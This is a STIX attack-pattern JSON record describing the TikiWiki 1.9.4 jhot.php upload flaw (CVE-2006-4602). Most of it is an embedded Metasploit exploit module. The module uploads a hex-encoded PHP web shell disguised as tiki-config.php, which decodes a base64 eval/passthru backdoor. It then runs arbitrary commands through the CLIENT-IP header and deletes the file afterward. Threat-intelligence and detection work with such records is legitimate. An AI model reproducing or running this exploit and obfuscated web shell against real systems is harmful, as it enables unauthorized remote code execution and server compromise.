{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--d33d7464-dff6-4a66-bf46-6f74110d0534",
    "created": "2024-08-14T17:13:30.466152Z",
    "modified": "2024-08-14T17:13:30.466156Z",
    "name": "TikiWiki jhot Remote Command Execution",
    "description": " TikiWiki contains a flaw that may allow a malicious user to execute arbitrary PHP code. The issue is triggered due to the jhot.php script not correctly verifying uploaded files. It is possible that the flaw may allow arbitrary PHP code execution by uploading a malicious PHP script resulting in a loss of integrity.  The vulnerability was reported in Tikiwiki version 1.9.4. ",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/exploits/unix/webapp/tikiwiki_jhot_exec.rb",
            "external_id": "tikiwiki_jhot_exec.rb"
        },
        {
            "source_name": "CVE",
            "external_id": "2006-4602"
        },
        {
            "source_name": "reference",
            "url": "http://web.archive.org/web/20061013183145/http://secunia.com:80/advisories/21733/"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\nclass MetasploitModule < Msf::Exploit::Remote\n  Rank = ExcellentRanking\n\n  include Msf::Exploit::Remote::HttpClient\n\n  def initialize(info = {})\n    super(update_info(info,\n      'Name'           => 'TikiWiki jhot Remote Command Execution',\n      'Description'    => %q{\n          TikiWiki contains a flaw that may allow a malicious user to execute\n        arbitrary PHP code. The issue is triggered due to the jhot.php script\n        not correctly verifying uploaded files. It is possible that the flaw\n        may allow arbitrary PHP code execution by uploading a malicious PHP\n        script resulting in a loss of integrity.\n\n        The vulnerability was reported in Tikiwiki version 1.9.4.\n      },\n      'Author'         => [ 'Matteo Cantoni <goony[at]nothink.org>' ],\n      'License'        => MSF_LICENSE,\n      'References'     =>\n        [\n          ['CVE', '2006-4602'],\n          ['OSVDB', '28456'],\n          ['BID', '19819'],\n          ['URL', 'http://web.archive.org/web/20061013183145/http://secunia.com:80/advisories/21733/'],\n        ],\n      'Privileged'     => false,\n      'Payload'        =>\n        {\n          'DisableNops' => true,\n          'Space'       => 1024,\n          'Compat'      =>\n            {\n              'PayloadType' => 'cmd cmd_bash',\n              'RequiredCmd' => 'generic perl ruby python bash-tcp telnet',\n            }\n        },\n      'Platform'       => 'unix',\n      'Arch'           => ARCH_CMD,\n      'Targets'        => [[ 'Automatic', { }]],\n      'DisclosureDate' => '2006-09-02',\n      'DefaultTarget'  => 0))\n\n    register_options(\n      [\n        OptString.new('URI', [true, \"TikiWiki directory path\", \"/tikiwiki/\"]),\n      ])\n  end\n\n  def check\n    res = send_request_raw(\n      {\n        'uri'     => normalize_uri(datastore['URI'], \"/tiki-index.php\"),\n        'method'  => 'GET'\n      }, 25)\n\n    http_fingerprint({ :response => res })  # check method\n\n    if (res and res.code == 200 and res.body.match(/TikiWiki 1\\.9\\.4/))\n      return Exploit::CheckCode::Appears\n    end\n    Exploit::CheckCode::Safe\n  end\n\n  def exploit\n    create_temp_file()\n\n    command = payload.encoded\n\n    exe_command(command)\n\n    remove_temp_file()\n  end\n\n  def create_temp_file\n    url_jhot = normalize_uri(datastore['URI'], \"/jhot.php\")\n\n    scode =\n      \"\\x0d\\x0a\\x3c\\x3f\\x70\\x68\\x70\\x0d\\x0a\\x2f\\x2f\\x20\\x24\\x48\\x65\\x61\" +\n      \"\\x64\\x65\\x72\\x3a\\x20\\x2f\\x63\\x76\\x73\\x72\\x6f\\x6f\\x74\\x2f\\x74\\x69\" +\n      \"\\x6b\\x69\\x77\\x69\\x6b\\x69\\x2f\\x74\\x69\\x6b\\x69\\x2f\\x74\\x69\\x6b\\x69\" +\n      \"\\x2d\\x63\\x6f\\x6e\\x66\\x69\\x67\\x2e\\x70\\x68\\x70\\x2c\\x76\\x20\\x31\\x2e\" +\n      \"\\x38\\x2e\\x32\\x2e\\x35\\x20\\x32\\x30\\x30\\x35\\x2f\\x30\\x38\\x2f\\x32\\x32\" +\n      \"\\x20\\x30\\x38\\x3a\\x30\\x30\\x3a\\x35\\x33\\x20\\x74\\x65\\x6c\\x65\\x6e\\x69\" +\n      \"\\x65\\x6b\\x6f\\x20\\x45\\x78\\x70\\x20\\x24\\x0d\\x0a\\x0d\\x0a\\x2f\\x2f\\x20\" +\n      \"\\x43\\x6f\\x70\\x79\\x72\\x69\\x67\\x68\\x74\\x20\\x28\\x63\\x29\\x20\\x32\\x30\" +\n      \"\\x30\\x32\\x2d\\x32\\x30\\x30\\x35\\x2c\\x20\\x4c\\x75\\x69\\x73\\x20\\x41\\x72\" +\n      \"\\x67\\x65\\x72\\x69\\x63\\x68\\x2c\\x20\\x47\\x61\\x72\\x6c\\x61\\x6e\\x64\\x20\" +\n      \"\\x46\\x6f\\x73\\x74\\x65\\x72\\x2c\\x20\\x45\\x64\\x75\\x61\\x72\\x64\\x6f\\x20\" +\n      \"\\x50\\x6f\\x6c\\x69\\x64\\x6f\\x72\\x2c\\x20\\x65\\x74\\x2e\\x20\\x61\\x6c\\x2e\" +\n      \"\\x0d\\x0a\\x2f\\x2f\\x20\\x41\\x6c\\x6c\\x20\\x52\\x69\\x67\\x68\\x74\\x73\\x20\" +\n      \"\\x52\\x65\\x73\\x65\\x72\\x76\\x65\\x64\\x2e\\x20\\x53\\x65\\x65\\x20\\x63\\x6f\" +\n      \"\\x70\\x79\\x72\\x69\\x67\\x68\\x74\\x2e\\x74\\x78\\x74\\x20\\x66\\x6f\\x72\\x20\" +\n      \"\\x64\\x65\\x74\\x61\\x69\\x6c\\x73\\x20\\x61\\x6e\\x64\\x20\\x61\\x20\\x63\\x6f\" +\n      \"\\x6d\\x70\\x6c\\x65\\x74\\x65\\x20\\x6c\\x69\\x73\\x74\\x20\\x6f\\x66\\x20\\x61\" +\n      \"\\x75\\x74\\x68\\x6f\\x72\\x73\\x2e\\x0d\\x0a\\x2f\\x2f\\x20\\x4c\\x69\\x63\\x65\" +\n      \"\\x6e\\x73\\x65\\x64\\x20\\x75\\x6e\\x64\\x65\\x72\\x20\\x74\\x68\\x65\\x20\\x47\" +\n      \"\\x4e\\x55\\x20\\x4c\\x45\\x53\\x53\\x45\\x52\\x20\\x47\\x45\\x4e\\x45\\x52\\x41\" +\n      \"\\x4c\\x20\\x50\\x55\\x42\\x4c\\x49\\x43\\x20\\x4c\\x49\\x43\\x45\\x4e\\x53\\x45\" +\n      \"\\x2e\\x20\\x53\\x65\\x65\\x20\\x6c\\x69\\x63\\x65\\x6e\\x73\\x65\\x2e\\x74\\x78\" +\n      \"\\x74\\x20\\x66\\x6f\\x72\\x20\\x64\\x65\\x74\\x61\\x69\\x6c\\x73\\x2e\\x0d\\x0a\" +\n      \"\\x0d\\x0a\\x23\\x20\\x24\\x48\\x65\\x61\\x64\\x65\\x72\\x3a\\x20\\x2f\\x63\\x76\" +\n      \"\\x73\\x72\\x6f\\x6f\\x74\\x2f\\x74\\x69\\x6b\\x69\\x77\\x69\\x6b\\x69\\x2f\\x74\" +\n      \"\\x69\\x6b\\x69\\x2f\\x62\\x61\\x6e\\x6e\\x65\\x72\\x5f\\x69\\x6d\\x61\\x67\\x65\" +\n      \"\\x2e\\x70\\x68\\x70\\x2c\\x76\\x20\\x31\\x2e\\x38\\x2e\\x32\\x2e\\x35\\x20\\x32\" +\n      \"\\x30\\x30\\x35\\x2f\\x30\\x38\\x2f\\x32\\x32\\x20\\x30\\x38\\x3a\\x30\\x30\\x3a\" +\n      \"\\x35\\x33\\x20\\x74\\x65\\x6c\\x65\\x6e\\x69\\x65\\x6b\\x6f\\x20\\x45\\x78\\x70\" +\n      \"\\x20\\x24\\x0d\\x0a\\x0d\\x0a\\x2f\\x2f\\x20\\x74\\x69\\x6b\\x69\\x77\\x69\\x6b\" +\n      \"\\x69\\x20\\x63\\x6f\\x6e\\x66\\x69\\x67\\x75\\x72\\x61\\x74\\x69\\x6f\\x6e\\x20\" +\n      \"\\x73\\x63\\x72\\x69\\x70\\x74\\x0d\\x0a\\x0d\\x0a\\x65\\x76\\x61\\x6c\\x28\\x62\" +\n      \"\\x61\\x73\\x65\\x36\\x34\\x5f\\x64\\x65\\x63\\x6f\\x64\\x65\\x28\\x22\\x5a\\x58\" +\n      \"\\x4a\\x79\\x62\\x33\\x4a\\x66\\x63\\x6d\\x56\\x77\\x62\\x33\\x4a\\x30\\x61\\x57\" +\n      \"\\x35\\x6e\\x4b\\x44\\x41\\x70\\x4f\\x33\\x4e\\x6c\\x64\\x46\\x39\\x30\\x61\\x57\" +\n      \"\\x31\\x6c\\x58\\x32\\x78\\x70\\x62\\x57\\x6c\\x30\\x4b\\x44\\x41\\x70\\x4f\\x32\" +\n      \"\\x56\\x6a\\x61\\x47\\x38\\x67\\x49\\x6d\\x31\\x35\\x58\\x32\\x52\\x6c\\x62\\x47\" +\n      \"\\x6c\\x74\\x49\\x6a\\x74\\x77\\x59\\x58\\x4e\\x7a\\x64\\x47\\x68\\x79\\x64\\x53\" +\n      \"\\x67\\x6b\\x58\\x31\\x4e\\x46\\x55\\x6c\\x5a\\x46\\x55\\x6c\\x73\\x69\\x53\\x46\" +\n      \"\\x52\\x55\\x55\\x46\\x39\\x44\\x54\\x45\\x6c\\x46\\x54\\x6c\\x52\\x66\\x53\\x56\" +\n      \"\\x41\\x69\\x58\\x53\\x6b\\x37\\x22\\x29\\x29\\x3b\\x0d\\x0a\\x3f\\x3e\\x0d\\x0a\"\n\n    data =\n      \"-----------------------------7d529a1d23092a\\r\\n\" +\n      \"Content-Disposition: form-data; name=\\\"filepath\\\"; filename=\\\"tiki-config.php\\\";\\r\\n\\r\\n\" +\n      scode +\n      \"\\r\\n\" +\n      \"-----------------------------7d529a1d23092a--\\r\\n\"\n\n    res = send_request_cgi({\n      'uri'     => url_jhot,\n      'method'  => 'POST',\n      'data'    => data,\n      'headers' =>\n        {\n          'Content-Type' => 'multipart/form-data; boundary=---------------------------7d529a1d23092a',\n          'Connection'   => 'Close',\n        }\n      }, 25)\n\n    if (res and res.message == \"OK\")\n      print_good(\"Successfully created temporary file.\")\n    else\n      print_error(\"Error creating temporary file.\")\n    end\n  end\n\n  def exe_command(cmd)\n    url_config = normalize_uri(datastore['URI'], \"/img/wiki/tiki-config.php\")\n\n    res = send_request_raw({\n      'uri'     => url_config,\n      'method'  => 'GET',\n      'headers' =>\n        {\n          'CLIENT-IP'  => \"#{cmd};\",\n          'Connection' => 'Close',\n        }\n      }, 25)\n\n    if (res and res.message == \"OK\" and res.body.match(/my_delim/m))\n      print_status(\"The server returned            : #{res.code} #{res.message} (#{res.headers['Server']})\")\n\n      cmd_output = res.body.match(/my_delim(.*)/m)\n\n      if (cmd_output)\n        print_status(\"Command output from the server :\")\n        print(\"\\n\" + cmd_output[1] + \"\\n\")\n      else\n        print_error('No command output found. This server may not be vulnerable.')\n      end\n    else\n      print_error(\"No response from the server\")\n    end\n  end\n\n  def remove_temp_file\n    url_config = normalize_uri(datastore['URI'], \"/img/wiki/tiki-config.php\")\n\n    res = send_request_raw({\n      'uri'     => url_config,\n      'method'  => 'GET',\n      'headers' =>\n        {\n          'CLIENT-IP'  => 'rm -f tiki-config.php',\n          'Connection' => 'Close',\n        }\n      }, 25)\n\n    if (res and res.message == \"OK\")\n      print_good(\"Successfully remove temporary file.\")\n    else\n      print_error(\"Error removing temporary file.\")\n    end\n  end\nend\n",
    "x_mitre_disclosure_date": "2006-09-02",
    "x_mitre_platforms": [
        "unix'"
    ]
}